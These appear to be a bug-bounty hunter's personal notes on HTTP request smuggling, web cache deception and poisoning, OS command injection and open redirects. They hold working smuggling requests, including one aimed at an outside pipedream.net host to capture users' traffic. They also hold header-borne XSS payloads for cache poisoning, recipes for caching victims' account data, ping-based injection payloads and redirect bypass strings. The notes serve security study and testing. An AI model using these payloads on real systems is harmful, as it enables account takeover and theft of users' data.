                 H2.TE via Request Header Injection       check the above write up  https://portswigger.net/research/http2
                 
                 
                 
                 H2.TE via Header Name Injection
                 
                 
                 H2.TE via Request Line Injection

    
    
    chheck   Desync-Powered Request Tunnelling              https://portswigger.net/research/http2

                     
    
    
    
    
    
    
    
    
    
    tip
    E.g.: Python removes the character \x85 with strip(), and JavaScript does not with trim()
    If an HTTP message is parsed using the trim() function in different languages, an HTTP Desync attack can occur
    
    
     tip
       in node server 
       As Nginx includes the character \xa0 as part of the pathname, the ACL rule for the /admin URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;
 When the URI           /admin\x0a     is received by the Node.js server, the character \xa0 will be removed, allowing successful retrieval of the /admin endpoint.
    
    
        IN FLASK   server
        it's possible to circumvent the ACL protection by adding the character \x85 at the end of the pathname:                        /admin\x85
        
        IN SPRING BOOT
           ACL protection can be circumvented by adding the character \x09 or \t at the end of the pathname
        
        
    
      tool
           check    https://github.com/defparam/smuggler
    
     type of REQUESTS WHERE ONLY SOME SERVERS RECOGNISE
    
    Transfer-Encoding: xchunked
    
  
  Transfer-Encoding : chunked
  
   Transfer-Encoding: chunked
   Transfer-Encoding: x
   
   Transfer-Encoding:[tab]chunked
   
   GET / HTTP/1.1
  Transfer-Encoding: chunked
  
 X: X[\n]Transfer-Encoding: chunked
 
 
Transfer-Encoding
 : chunked

    
    
    
    
    
 1)          CL.TE   
       test case
 POST / HTTP/1.1
Host: cyberseccafe.com
Transfer-Encoding: chunked
Content-Length: 4

1
F
X        
 
 this request will trigger a noticeable time delay in the response because it sends a chunked request with a hanging byte on the end if the vulnerability is present
 NOTE-- Tip: I’d recommend pasting this request in your BurpSuite and highlighting the body to understand where the Content-Length cuts off. Since the length is 4, it will leave the X hanging.

We can send a basic request like the following to fully confirm the vulnerabiliTY
 
 POST /search HTTP/1.1
Host: cyberseccafe.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Transfer-Encoding: chunked

ff
q=smuggler&z=
0

GET /404 HTTP/1.1
Foo: z


 So, if this vulnerability is present, sending a second request after the first will return a 404 error — confirming a CL.TE request smuggling vulnerability is present.
    the 404 error will look like this 
    
    GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
 
 
 
           
2)   TE.CL   
 The front end interprets the Transfer-Encoding header, and the back end uses the Content-Length   
 
POST / HTTP/1.1
Host: cyberseccafe.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

 If you send the same request again, it should attempt an XPOST method, appending the hanging chunk to the beginning of the following request.
Once observed, you can send the following POC to confirm the found vulnerability:          
     
  POST /feature HTTP/1.1
Host: cyberseccafe.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

8f
GET /404 HTTP/1.1
Host: cyberseccafe.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
z=
0      


Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it.



 


3) TE.TE
 The last example of a Request Smuggling attack is when both front end and back end support the Transfer-Encoding header. As an attacker, you can use obfuscation of the TE header to attempt to induce either the front end or back end to not process it. You can then smuggle in a second request like shown abov           
           
           
           
           
           Exploiting HTTP request smuggling vulnerabilities
           
       1  bypass the access controls
           
             Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack:

POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com

The front-end server sees two requests here, both for /home, and so the requests are forwarded to the back-end server. However, the back-end server sees one request for /home and one request for /admin. It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL.
            
         
      2)   Revealing front-end request rewriting                               see   more https://portswigger.net/web-security/request-smuggling/exploiting
                         to do this 
                                   Find a POST request that reflects the value of a request parameter into the application's response.
                             Shuffle the parameters so that the reflected parameter appears last in the message body.
                          Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal
                          
          
      3)Bypassing client authentication          see   more https://portswigger.net/web-security/request-smuggling/exploiting
      
      
      
     4    Capturing other users' requests

      5  Using HTTP request smuggling to exploit reflected XSS
      
      6   Using HTTP request smuggling to turn an on-site redirect into an open redirect
      
      7  Turning root-relative redirects into open redirects
      
      8 Using HTTP request smuggling to perform web cache poisoning
     
     
     
     tip
     use smuggler tool by defparams
         check fr intersing parameter and sent it to  burp
           then check of   TECE  OT CETE 
        
           
           
           
           tip     https://portswigger.net/research/trace-desync-attack
           
           when every method seems unexplotatable, try checking if the backend request is configured to use trace http method
           note that  TRACE method is not really used in modern systems, some of the most popular web servers have this feature active by default and need to be disabled explicitly. Servers like Apache and many Microsoft IIS and Tomcat versions will respond to TRACE requests if no custom configuration is applied.
           
    
     
  1.Using HTTP Request Smuggling Burp Extension either burp community or pro. you can widen your scope by adding more subdomains and URLs select them all and from the extension tab click smuggle probe.

‌2. Using smuggler.py tool which is a command line tool that replicate almost the same work of burp extension.

# Single Host:
python3 smuggler.py -u <URL>

# List of hosts:
cat list_of_hosts.txt | python3 smuggler.py
‌Note: These scanner will not guarantee the existing of vulnerability, there are false positives so you need to validate every finding of any of these tools. ‌
    FINDINGS
    
    run burp extension scanner on all the subdomain   and check for the response
    validate findings by sending some chunked data
    POST / HTTP/1.1 
Host: subdoamin.readcted.com
Upgrade-Insecure-Requests: 1 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 7 
Transfer-Encoding: chunked 
Transfer-encoding: identity


1
A
0

  To exploit HTTP Request Smuggling Vulnerability you have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:

POST / HTTP/1.1
Host: redacted.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked
Transfer-encoding: identity

0

GET /video HTTP/1.1
Foo: x

    Escalating to Full Account takeover
Now let’s craft our request that will be smuggled to send our malicious one. I will request bin to receive users traffic into my endpoint. the payload shall looks like the following: ‌

POST / HTTP/1.1
Host: redacted.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Transfer-Encoding: chunked
Transfer-encoding: identity

0

GET /video HTTP/1.1
Host: enfliy4kmrr8i.x.pipedream.net
Foo: x
    
           
           
           dump two request at a time  change the http/2 tp http/1 , and focus on  the second request that no user agent is involved 
            example 
             GET /test?a=a% HTTP/1.1
            Host: admin.target.com
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
 
           GET /admin/login HTTP/1.1
            Host: admin.target.com

           
          Host: admin.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

GET /admin/login HTTP/1.1
Host: admin.target.com Cache possioning       



     tip  
     For this particular HHI case, it is only exploitable by adding a letter /a as a GET parameter (I tried with other letters, and only this one worked -weird-), allowing the redirection of the domain *****.net to evil.com.
   GET /a  http 1/1
   host: eveil.com
   
   
   verification 
   Request
   POST /  http1/1
   host: victiom.com
   transfer encoding : chunked
   content-leghth : 51
   6
   DESYNC
   0
   
     GET /a  http 1/1
   host: eveil.com
   
    the above request gave out the responses
    
    while exploring the above request, run a noumber of request like the example below
       POST /  http1/1
   host: victiom.com
   transfer encoding : chunked
   content-leghth : 51
   6
   DESYNC
   0
   
     GET /a  http 1/1
   host: a: 11111111111
   
   11 characteres 1 = 65535
   10 characteres 1 = 13767
    
    
    tip tip
    write a  dynamic header rewrite rule with a specific value: concat("-", "\x0d\x0aTransfer-Encoding: chunked")
    In combination with a POST body that was carefully crafted to include elements like 0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n, I succeeded in making HTTP request smuggling appear remarkably straightforward.
   
   
      tip
  use these new content-length specific techniques:                              https://portswigger.net/research/how-to-turn-security-research-into-profit

Content-Length: +7
Content-Length: 0, 7
Content-Length: 7.0



    if there is a web socket 
                           https://bishopfox.com/blog/h2c-smuggling-request



  tip
    check if you could  manipulate a paraticular HTTP header  and check i the way how proxies communicated with each other and how this could allow request smuggling attacks 
    
    
    
    
       NOTE
           DURING HTTP/2 ,                                            https://blog.devgenius.io/tryhackme-http-2-request-smuggling-write-up-12ff147e3eeb
                CRLF injection is not restricted to HTTP/2 headers only. Any place where you send a \\r\\n that potentially ends up in the HTTP/1.1 request could potentially achieve the same results. Note that each proxy will try to sanitize the requests differently, so your mileage may vary depending on your target.


                                                   
                                                   
                                                   
                                                   
                                                   WEB CACHE DECEPTION       WEB CACHE DECEPTION   / CACHE POISONING              CACHE POISONING
                                                   
                                                   
                                                       TOOL       https://github.com/xhzeem/toxicache
                                                                    https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
                                                                                                    check             https://www.hackmanit.de/en/blog-en/145-web-cache-vulnerability-scanner-wcvs-free-customizable-easy-to-use
                                                                                                                             https://www.hackmanit.de/en/blog-en/142-is-your-application-vulnerable-to-web-cache-poisoning
                                                   
                                                   
                                                   
                                                   Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users
                                                   web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful,  they need to make sure that their response is cached and subsequently served to the intended victims.
                                                   
                                                   
                                                   
                                                   Web Cache Deception attacks occur when an attacker forces the front-end server to cache sensitive data and then retrieve it from the cache.
                                                   the front-end server know when to cache the request by using the cache keys 
                                                   
                                           IDENTIFYING unkeyed inputs
                           You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. This can be obvious, such as reflecting the input in the response directly, or triggering an entirely different response. However, sometimes the effects are more subtle and require a bit of detective work to figure out. You can use tools such as Burp Comparer to compare the response with and without the injected input, but this still involves a significant amount of manual effort.
                           
                          or  you use param miner too in burpsuite
                            To use Param Minery  ---- simply right-click on a request that you want to investigate and   ----    click "Guess headers    // chcek the output on issues or in the Output" tab of the extension
                            note
                            add a cache buster (such as a unique parameter) to the request line each time you make a request so that they will only be served to you
                                           
                                                   
                                               
                                               
                                               tip                          https://portswigger.net/research/practical-web-cache-poisoning
                                  web cache poinoining methodology
                                    1  identify unkeyed inputs                                        using param miner
                                    2the next steps are to assess how much damage you can do with it, then try and get it stored in the cache. If that fails, you'll need to gain a better understanding of how the cache works and hunt down a cacheable target page before retrying. Whether a page gets cached may be based on a variety of factors including the file extension, content-type, route, status code, and response headers.
                                       Basic Poisoning
                                       Discreet poisoning
                                       Selective Poisoning
                                       DOM Poisoning                                                                   check for   'X-Forwarded-Host' match/replace rule  
                                       Route poisoning              
                                                   
                                                   
                                  
                                                   
                            Web Cache deception             methodology  
                            TIP
                             CHECK  Cloudflare’s caching documentation AND OTHERS WEB TO BE MORE ACTIVE WITH WEB CACHING
                             Cloudflare
                             class, css, jar, js, jpg, jpeg, gif, ico, png, bmp, pict, csv, doc, docx, xls, xlsx, ps, pdf, pls, ppt, pptx, tif, tiff, ttf, otf, webp, woff, woff2, svg, svgz, eot, eps, ejs, swf, torrent, midi, mid
                             
                             NGINX
                             (css|js|gif|png)$ { proxy_cache my_cache … }. If an authenticated user accesses http://www.sampleapp.com/app/welcome.php/test.css, NGINX considers it a static file and caches it.
                             
                             
                             
                            
                            
                tip      always read                                https://kuldeep.io/posts/web-cache-deception-without-path-confusion/
                                                                               https://medium.com/@hbenja47/how-do-i-search-for-web-cache-deception-6c5f318016ca
                                                                             https://x.com/0xRAYAN7/status/1804963882676465674
                                                                             https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
                                                                                https://book.hacktricks.xyz/pentesting-web/cache-deception?                       and explotatiom
                                                                                     https://infosecwriteups.com/a-web-cache-deception-chained-to-a-csrf-the-recipe-9e9a5b5f53aa
                                                                                https://medium.com/@hbenja47/my-first-two-valid-and-rewarded-web-cache-deceptions-earning-2250-c8d2a6968713
                                                                                https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/          /////////  mitigation    always read
                                                                               
              
              
              
              
              *****The very first step towards discovering a WCD vulnerability is to log in to the target application as a normal user and make notes of interesting and important  endpoints.
                ****What makes an endpoint interesting? Well, it highly depends on the nature of the application. For example, if it is a betting application, maybe knowing how many bets you have made might be interesting. If it is a                                        banking application, most of the endpoints might be interesting because you do not want anyone to know your bank details               
                 ****** note all endpoint that discloses PII information    and  ( This can be done easily using Burp’s ‘Search’ feature to look for sensitive data only in responses (headers and body)
                 
                  *****make  sure that the endpoints that you come across are using cookies as the authentication mechanism instead of bearer tokens
                  ****     check the response for CACHE-RELATED HEADERS to see if you see any cache HITs.  HIT means that the response is served from the cache. When it is the otherwise, you will see a MISS instead of HIT.
                            ( use static extensions like .png, .css, .js, avif, js, css, ico, .png, .bmp, .gif et cand many others.)            Why do we see cache HITs? Because front-end servers might be configured to cache JS files, CSS files, images, etc
                            
                                                                            check if they provide explicit information about the caching mechanism in their headers, such as ‘no-cache,’ ‘private-cache,’ ‘public-cache,’ ‘max-age,’ etc
                                                                                   ( use static extensions like .png, .css, .js, and many others.    You can find lists of these extensions and even perform fuzzing)  
                                                                                             
                                                                             
                  ******                     If you see any cache HITs in the interesting endpoints, it can likely be exploited
         ******           if the application used bearer tokens, we cannot exploit this by simply sending the URL to the victim. It would require an XSS to exploit. And if you already have an XSS, there is no point exploiting WCD
         
                                        
                                        
                                        
                                        
                                        
                            read on so many expolit            https://youst.in/posts/cache-poisoning-at-scale/
                                        
                                        
                                        ##### EXPOLIT   1 RECIEVING SENSEITIVE INFORMATION FROM THE VICTIMS
         ****** assume that we have found that  https://smartkelvin.io/account/billing/nonexistent.js results in a cache HIT and the web application is using cookie
                          1     Send this URL to the victim: https://smartkelvin.io/account/billing/nonexistent.js
                          2   Once the victim visits the URL from his/her authenticated session, the backend server will respond with the billing information. The front-end server will cache the response because it believes that the response is coming from a JS file and JS files should be cached.
                          3  let the attacker  visit   the https://smartkelvin.io/account/billing/nonexistent.js  URL. Because the response has been cached, the attacker will receive a cached copy from the front-end server. This cached copy includes all the billing information of the victim
                          
                            #### EXPOLIT     https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6
                             found a particular sensible URL/endpont     was not being cached, but if i added an cacheable extension file (.js , .css) at the end of URL, it would cache the response.
                             check and find xss both in parameter and in the cookie
                             try X-Forwarded-For” Headers to avoid WAF
                             send it to the victim
                             
                             #### EXPLOIT     https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-3-91f9d836e046   
                                           Cache Poisoning DoS Via X-Forwarded-Scheme Header
                             
         
            
            LIMITATIONS
WCD will not work if the user isn’t logged in.
It will not work if the application is using bearer tokens as the authentication mechanism.
In some configurations, the cache will only be served if you are in the same region as the victim.
If you accidentally visit the URL that you sent to the victim, the victim will receive the cached copy instead of you.
Even if you get the victim to cache his/her response, the cache may get invalidated after a few seconds or minutes.
                   Conditions
                   
When adding the /nonexistent.css path to the page to be cached, it must return the original content (sometimes it may return a 404 error but still cache the victim’s information).
The web caching functionality must be configured to cache files based on their extension.
The victim must be authenticated when accessing the malicious URL.
         
         
        
           
         
         TIP         HOW I TEST BY BXMBN        
                    https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
         If the application does not have a login functionality, but using Akamai CDN,
              Send the first request to Repeater
              Check if the server is caching normal requests (you can tell this by the response header “Server-Timing: cdn-cache; desc=HIT
              Add an Illegal Request Header into the request , THIS WOULD LEAD TO 404 RESPONSE FROM THE SERVER
              If the response was successfully cached, when you open the URL on any browser, you should get a 400 Bad Request
                   
              
                 ****
              
         If the Application does have a Login Functionality
               Check if any sensitive information/ endpoint  in any page (e.g Session Token
                Send the request to Repeater
                Add a Cacheable Extension (.js , .css) at the end of the URL and see if it gives a 200 OK Response
                Open the Modified URL using your authenticated Account
                
                Open the Same URL using curl or Private Web Browser Window
                If the Token was successfully Cached you should see the Token in the response
                
                
            ******
            If the Application is using Cloudflare CDN
                 Illegal headers won’t work, and now most Cloudflare Customers are using (check for bypass   https://hackerone.com/reports/1391635) Cache Deception Armor
                 
                 
        
         /
           
           
         
         
    tip     https://medium.com/@snoopy101/web-cache-deception-attack-on-a-private-bug-bounty-program-52872cbdeedc
        try put full.css    or  append an extension at the end of the url/ endpoint and watch the response(the server timing, if there is a hit ) , find a way to  send multiple requests to the endpoint from victim’s behalf
       
           
          tip                                                                       https://infosecwriteups.com/dos-via-cache-poisoning-38f3a87f997c      //   VERY IMPORTANT READ// ///
          the “X-Cache” header, check that its value is “HIT” indicating that the response comes from the cache. Otherwise, its value would have been “MISS”, note  that the presence of X-Cache is not systematic. Sometimes similar headers perform the same function and are quite easily identifiable, the value being HIT or MISS.
          
  /////   Second important element: the “Age” header, indicating the number of seconds since the cached (storage) of the response/resource that was served to us. This header is sometimes accompanied by the “Cache-Control” header containing the caching directives, an important directive for us , also check for the “max-age” indicating the time limit in seconds for storing the resource.
The information transmitted by these two headers is particularly useful for an attacker to know exactly when to send his malicious request so that it is cached.

  ///  Third important element: the “Vary” header can be a great help when identifying the cache key, Vary is often used to specify additional headers to be part of the cache key ; “Accept-Encoding” and “x-wf-forwarded-proto” in the case of our answer above, but it can also include user-agent or even cookies.. etc. I specify that there are sometimes additional headers forming part of the cache key not being specified in “Vary”.
  
     tip
   always check the  phase of analysis and understanding of the target cache in order to identify the cache keys, the caching duration, etc.  analyz the server response and check what cache system that is in place and be aware of server headers as part of the cache key
    
     also alway add cach buster in order not to kill and affect production sites
      -> If the cache stores the response from: https://www.example.com/
     -> And a user requests: https://www.example.com/?test=test
     
Then the cache — when comparing the cache keys — will not find an identical version and will forward the request to the server (the URL/request line being part of the cache key).
And it is precisely this behavior that we will use as researchers in order to carry out tests without compromising the target; during our tests, we will always add a parameter to the target URL so that the cached version — potentially poisoned — is only accessible from the URL containing our unique parameter. We will avoid harming the users of the platform in question and can carry out our tests quietly.


          tip
      https://example.com/private_info.js?cachebuster=1
https://example.com/private_info/.css?cachebuster=1
https://example.com/private_info/;.png?cachebuster=1
note       /////    Adding the character “ ; “ before the extension is often very useful: it allows -sometimes- to return a 200 when the simple addition of an extension returns a 404 error. I should nevertheless point out that caching a 404 page is not without everything impact, it happens that the personal information of the connected user is still present on the page, so be careful.
 
 tip
  aslo, try switching from POST to GET   
      
      
      STEPS INVOLVES 
           identification of Unkeyed Inputs
           Exploitation of the Unkeyed Inputs
           Ensuring the Poisoned Response is Cached
       
       DISCOVERY: CACHING ERROR CODES                           https://book.hacktricks.xyz/pentesting-web/cache-deception?
If you are thinking that the response is being stored in a cache  ( by Cache Headers  , Cf-Cache-Status or  X-Cache = miss, when wasnt cache, and hit when cache..  ), you could try to send requests with a bad header, which should be responded to with a status code 400. Then try to access the request normally and if the response is a 400 status code, you know it's vulnerable (and you could even perform a DoS).    https://book.hacktricks.xyz/pentesting-web/cache-deception/cache-poisoning-to-dos
           
           tip
           When caching a request, be careful with the headers you use because some of them could be used unexpectedly as keyed and the victim will need to use that same header. Always test a Cache Poisoning with different browsers to check if it's working.
       
         
      
      
      WEB CACHE IN A NUT SHELL METHODOLOGY
      The attacker sends the victim the malicious URL https://www.bank.com/account.smart/logo.png.      //  this is because the any png file is cache
The victim accesses the URL (they must be logged into their account beforehand).
The request reaches the proxy, which is unaware of this file and asks the server about it.
The server responds with the victim’s account content using a 200 OK status.
The caching system receives the file and identifies that the URL ends with a static file extension (.png), treating it as a public static file and creating a cache folder with the file logo.png.
The victim receives their account page as usual.
The attacker accesses https://www.bank.com/account.do/logo.png, and the request is received by the proxy, which returns the cached victim’s account page.



    


   NEXT.JS VULNERABILITY TO CACHE POINSONING                      https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
  **  by    adding the x-middleware-prefetch  ->   adding the x-middleware-prefetch header results in an empty JSON object {} as a response. If a CDN or caching system is present, this empty response can potentially be cached —depending on the cache rules configuration—
     
      x-invoke-status: 888 as a heade
    
    
    
       my owner understanding       i will update at times goes
       
       the webserver  caches .png files
          the attacker observes that the server caches .png files
           the attker visit     https://www.bank.com/account.  and login
           having in mind that the server caches .png , he created a malicious link  https://www.bank.com/account.do/logo.png  which is no where in server
           he send it to the sever, the request reaches the server and the server respond with  404 not found, because the server caches .png files, it think that it is valid request because it contains https://www.bank.com/account.do/logo.png , it cache it into the server
           
           then when the victin access  https://www.bank.com/account.do, the sever render 404pages been cache by prior request , thereby giving the victim  inability  to the request
           
           VIA XSS TO ACCOUNT TAKEOVER, limitation is that the victim will be login before it is succesfful
           the  attacker observes that the server caches .png files 
               the attaker visit  https://www.bank.com/account , having in mind that the server caches .png files, he poinson it to https://www.bank.com/account.do/logo.png  and places an xss payload inone of the headers
               the sever recieve the request and cache it because it contain .png endpoint, 
               the  attcaker send https://www.bank.com/account.do   to the victim , because the server have cached a poinson link, it renders the poinson link to the victim and the xss  been  added  X-Forwarded-For header: "><script>alert(1)</script>  send requests until you get "CF-Cache-Status: HIT" from the server being cache is fired.
               the attacker visit https://www.bank.com/account.d and every of the victim cookies and personall infromation is render in the browers  upon navigating to the cached endpoint.
               
               \\\  check if you add some X-Forward Header to your request, it might strike wonders. Check for Headers of the loadbalacers and add some of it to the website been tested 
               \\\  check if you could brute xss between the endpoint and the cache
                                      example     https://subdomains.example.com/somefolder/someendpoint.html
                                                         https://subdomains.example.com/somefolder/someendpoint/"><script>alert(1)</script> /smart.css  
               
               
                 
                 STEP TO EXPOINT MY SECOND UNDERSTANDING OF CACHE
                
1. Intercept the request to the following page https://subdomain.example.com/somefolder/someendpoint/smart.css using burpsuite or any other tool.         // smart.css was added because the website cache css files 
2. Add the X-Forwarded-For header: "><script>alert(1)</script>
3. Get the request to the Burp repeater and send requests until you get "CF-Cache-Status: HIT" from the server
4. Remove the X-Forwarded-For header and send the request again, note that XSS payload is still being served from the cache
5. Navigate to the cached endpoint from different browser and note that alert will execute.
                 
                          
       https://subdomains.example.com/somefolder/someendpoint.html
       https://subdomains.example.com/somefolder/someendpoint/smart.css  
       
      tip
       note  that the response contains the Set-Cookie header. Responses containing this header are not cacheable on many site


       
      WEB CACHE POISONING TECHNIQUES:                             https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
Unkeyed header poisoning  
      adding  X-Forwarded-Host    or any other header to the request and theheader is poisoned
  X-Forwarded-Host: innocent-website.co.uk      to    X-Forwarded-Host: a."><script>alert(1)</script>"
  
 unkey  poisoning  of resource imports 
   X-Forwarded-Host: innocent-website.co.uk       to   X-Forwarded-Host: evil-user.net
  
Unkeyed parameter poisoning
Parameter cloaking
Fat GET
HTTP response splitting
HTTP request smuggling
HTTP header oversize (HHO)
HTTP meta character (HMC)
HTTP method override (HMO)
    
    
       3 web cache deception techniques:
Path Parameter
Path Traversal
Appended Newline, Null Byte, Semicolon, Pound, Question Mark or Ampersand


    
    
  
  
  NOTE                                 THIS IS PATH CONFUSION
         https://kuldeep.io/account/billing
         https://kuldeep.io/account/billing/nonexistent.js                    
         
  
   
      
      NOTE
            It is sometimes necessary to resend the “poisoned” request several times so that it is stored in the cache.  It is therefore through trial and error that it will be necessary to go through to understand the operation of the cache to be exploited.    
            
            tip
             it was possible to cause an 400 error by adding an illegal header when it comes to Akamai CDN, ex:
             
             \: 
The caching of the error will then depend on the cache configuration.


   tip
     
       fuzzing endpoint, if found , check if it is vunearblly to web cache deception    
           example
                GET    /api/auth/csrf        HTTP/2    then  fuzz
                                     GET /api/auth/FUZZ  then got
                                     GET /api/auth/session/hi/shaths.jpeg?ok           which is vulnerable to web cache
                                     
                                     
              
                                     
            tip
            check out  your client load balancers and if is CloudFlare, it  has a list of default extensions that gets cached behind their Load Balancers. https://developers.cloudflare.com/cache/about/default-cache-behavior/
"Cloudflare only caches based on file extension and not by MIME type"
Basically, if we manage to find a way to load the same endpoint with one of the specified file extensions below, while forcing the endpoint to keep the Sensitive JSON data, we will be able to have it cached.


     tip
     com/api/auth/session.css -> 400     - didn't work'
     
     com/api/auth/session/test.css - 200 - success
            
                                  
              
                                                   
                                                   
                                                   
           tip
     The easiest way to find a max-impact desync vulnerability in 2024:
     https://t.co/Movn1BiqmR
     https://x.com/albinowax/status/1755507629940457959

1. Create a novel desync technique
2. Add it to a tool like HTTP Request Smuggler
3. Scan a bunch of systems and see what sticks. 
The only tricky step is #1 and there's a new tool to help with this 1/2
  check this tool  on of novel techniques - check out the docs and presentation!
  https://t.co/Movn1BiqmR
                                        
                                        
                                        
            tip     tip  
            subdomain.target.com  on su.txt                                                 https://medium.com/@mohamed0xmuslim/3-easy-cash-via-cache-99d600565ac5
            create an account
            check  if   https://subdomain.target.com/gb/account/ endpoint have an object called window.current_user which retrieve user sensitive info like user_id, email, phone, etc
           check to   See if   the header Cf-cache-status: Dynamic             this  means that Cloudflare did not consider the URL to be eligible for caching
            add /test.css so https://subdomain.target.com/gb/account/test.css   and check/notice  that you got “Page not found” page not found but the Cf-cache-status changed from DYNAMIC to MISS
             look at the “Page not found” page source code and notice that window.current_user object still exist and have all user info
              Open the url https://subdomain.target.com/gb/account/test.css from different browser and make sure that the data still exist
                                                   
                                                   
                                                   
           we manage to force the Load Balancer into caching our request on a specific crafted path of ours, we will be able to read our victim's sensitive data from the cached response.It wasn't straight-forward in this case
           
  NOTE  :     Relaxed cache rules can be very dangerous, especially with URL parser confusions.  In a website that uses caching, the request must go through the CDN before it gets the the web server. This means that the URL gets parsed twice, which makes it possible for a URL parser confusion
           
  allows check for this endpoint share/%2F..%2Fapi/auth/session?cachebuster=123   
           
   ****
   first thing is to try is to fetch the resource with a file extension appended to the endpoint 
   example
   api/auth/session/test.css
   /api/auth/session.css
   /notifications/logo.png 
   /stylesheet.css 
   
   Conditions
So basically, two conditions are required for this vulnerability to exist:
Web cache functionality is set for the web application to cache files by their extensions, disregarding any caching header.
When accessing a page like http://www.example.com/home.php/non-existent.css, the web server will return the content of "home.php" for that URL.
   
      Mitigation
Configure the cache mechanism to cache files only if their HTTP caching headers allow. That will solve the root cause of this issue.
If the cache component provides the option, configure it to cache files by their content type.
Configure the web server so that for pages such as http://www.example.com/home.php/non-existent.css, the web server doesn’t return the content of "home.php" with this URL. Instead, for example, the server should respond with a 404 or 302 response.


   tip
   Guess everything using Param Miner extension.
   check for unkeyed header in the request  of param miner
    added the `X-Forwarded-Host: example.com`  in burp repeter , host header in the first request and checked the response.
   the original host will be over written with example.com
   open the url in the private browser and check if The example.com was still showing in the response  and then excalte to xss or html injection
   
   below is the html injection
   GET /blog?abcde=234 HTTP/2
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
X-Forwarded-Host: test.com"><h1>themarkib0x0
Accept-Encoding: gzip, deflate, br
Content-Length: 2
        

                         
                              
 
           

           
           
           
   

 



      COMMAND INJECTION                                COMMAND INJECTION                                           COMMAND INJECTION
      https://portswigger.net/web-security/os-command-injection
      https://medium.com/@dhruvsingh0203/hola-hackers-im-dhruv-singh-a-cybersecurity-enthusiast-passionate-about-exploring-the-depths-834a9d140115
      
        OS Command Injection is a type of vulnerability where an attacker can execute arbitrary commands on a host operating system through a vulnerable application
        
        
        tip    in any user input , check for os command injection
        ping -n 11 127.0.0.1||ping -c 11 127.0.0.1


   testing with payloads
   <request>
  <a_name>John Doe</a_name>
  <a_MobileNumber>1234567890</a_MobileNumber>
  <a_EMAILID>johndoe@example.com</a_EMAILID>
  <a_AdhaarNumber>1234567890123</a_AdhaarNumber>
  <a_Country>India</a_Country>
</request>
       
            to   this below
            
            <request>
  <a_name>John Doe</a_name>
  <a_MobileNumber>1234567890</a_MobileNumber>
  <a_EMAILID>johndoe@example.com</a_EMAILID>
  <a_AdhaarNumber>|ping -n 11 127.0.0.1||ping -c 11 127.0.0.1</a_AdhaarNumber>
  <a_Country>India</a_Country>
</request>
   check for delay,  the delay suggest that the command was being executed on the server, confirming the vulnerability



      

         OPEN REDIRECT      OPEN REDIRECT      0PEN REDIRECT
   https://infosecwriteups.com/story-of-a-1000-open-redirect-1405fb8a0e7a
   
     
   
   
   check
   https://github.com/r0075h3ll/Oralyzer                             //     try crlf redirection bypass with this tool 
                         check my javascript_alert_redirct   for payload to byppass oprn redirect   to achieve full ATO
        
        tip
        You can bypass whitelist filter in openredirect by this way:
https://freevisit.ru/redirect/?g=https://ⓦⓦⓦ.ⓕⓑⓘ.ⓖⓞⓥ
        
   

is also possible to use meta tags to redirect the users to another site:
&lt;meta http-equiv="Refresh" content="0; url=http://www.newsite.com/" > And finally, for redirections using JavaScript, we can use different functions to do that; here are the main functions for doing so:

window.open('http://www.testsite.com') location.replace('http://www.testsite.com') location.assign('http://www.testsite.com') location.href='http://www.testsite.com'
location='http://www.testsite.com'
location.port='8080'
document.URL() URL
   
   
   Ssrf with open redirect 

Go to burp site map,  filter it with only open riderct

Then check for redirect that leads to ssrf
   


Open redirects are not complex to exploit. Once you confirm the vulnerability, you will just have to insert the destination into the request. The following are the most common redirections that you could insert in an open redirect vulnerability:
/%09/testsite.com /%5ctestsite.com //www.testsite.com/%2f%2e%2e //www.testsite.com/%2e%2e //testsite.com/
//testsite.com/%2f..
//\testsite.com /\victim.com:80%40testsite.com I also recommend you exploit the following parameters; just inject the destination in the target value:
